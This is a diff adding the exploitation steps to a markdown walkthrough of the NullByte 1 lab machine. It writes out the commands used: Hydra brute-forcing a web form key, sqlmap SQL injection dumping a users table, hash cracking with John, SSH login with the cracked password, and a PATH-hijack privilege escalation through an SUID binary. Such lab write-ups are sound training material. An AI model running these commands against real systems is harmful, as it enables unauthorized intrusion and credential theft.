@@ -61,3 +61,85 @@
     * Assume the "kzMb5nVYJw" is directory and access to it  
     ![kzMb5nVYJw](./img/nullbyte1_server7.png)  
         - It demands to input a key  
+
+## Execution  
+1. Attack the kzMb5nVYJw form  
+    * the kzMb5nVYJw form sends to "index.php" by POST method  
+    ![kzMb5nVYJw-form](./img/nullbyte1_server8.png)  
+    * The form shows an error message as "invalid key"  
+    ![Error-message](./img/nullbyte1_server9.png)  
+    * Use Hydra  
+    ![Hydra-Result](./img/nullbyte1_server10.png)  
+        - `hydra -l test -P ~/vulnhub/SecLists/SecLists-master/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt $IP http-post-form "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"`  
+        - Password: **elite**  
+
+1. Authenticate with the key  
+    * Input the password in the kzMb5nVYJw form  
+    ![index.php](./img/nullbyte1_server11.png)  
+        - The page gets data from the "420search.php"  
+
+1. Do SQL injection  
+    * Get the database lists  
+    ![Database-lists](./img/nullbyte1_server12.png)  
+        - `sqlmap -u "http://$IP/kzMb5nVYJw/420search.php?usrtosearch=" --dbs`  
+    * Enumerate the "seth" database tables  
+    ![seth-tables](./img/nullbyte1_server13.png)  
+        - `sqlmap -u "http://$IP/kzMb5nVYJw/420search.php?usrtosearch=" -D seth --tables`  
+    * Investigate the users table  
+    ![users-columns](./img/nullbyte1_server14.png)  
+        - `sqlmap -u "http://$IP/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users --columns`  
+    * Show users table data  
+    ![users-data](./img/nullbyte1_server15.png)  
+        - `sqlmap -u "http://$IP/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users -C id,position,user,pass --dump`  
+
+1. Decode the password  
+    * Decode with Base64  
+        - `echo -n "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE" | base64 -d`  
+        - The hash: c6d6bd7ebf806f43c76acc3681703b81
+
+1. Analyze the hash  
+    * Use John  
+    ![ramses-pass](./img/nullbyte1_server16.png)  
+        - `echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt`  
+        - `john --format=raw-md5 hash.txt`  
+        - ramses's password: **omega**
+
+## Persistence  
+1. Access to the SSH service  
+    * Use ramses password  
+    ![ramses-ssh](./img/nullbyte1_server17.png)  
+        - `ssh ramses@$IP -p 777`  
+
+1. Investigate the commnads histories  
+    * See .bash_history  
+    ![bash-history](./img/nullbyte1_server18.png)  
+        - `ls -la`  
+        - `cat .bash_history`  
+        - Move to "/var/www/backup" and execute the "procwatch" program  
+
+1. Investigate the file  
+    * See "procwatch" file  
+    ![procwatch-file](./img/nullbyte1_server19.png)  
+        - `cd /var/www/backup`  
+        - `ls -la procwatch`  
+        - `file procwatch`  
+        - The "procwatch" file is SUID file  
+    * Execute the procwatch file  
+    ![Execute-procwatch](./img/nullbyte1_server20.png)  
+        - The file is the "ps" command  
+
+## Privilege Escalation  
+1. Do privilege escalation with the procwatch file  
+    * Change the PATH priority  
+        - `export PATH=/tmp:$PATH`  
+    * Make false ps shell  
+        - `echo "/bin/sh" > /tmp/ps`  
+        - `chmod 777 /tmp/ps`  
+    * Execute the "procwatch" file  
+    ![Privilege-Escalation](./img/nullbyte1_server21.png)  
+        - It displays the root prompt  
+
+## Credential Access  
+1. Open the root flag file  
+    * Open the proof.txt  
+    ![Root-flag](./img/nullbyte1_server22.png)  
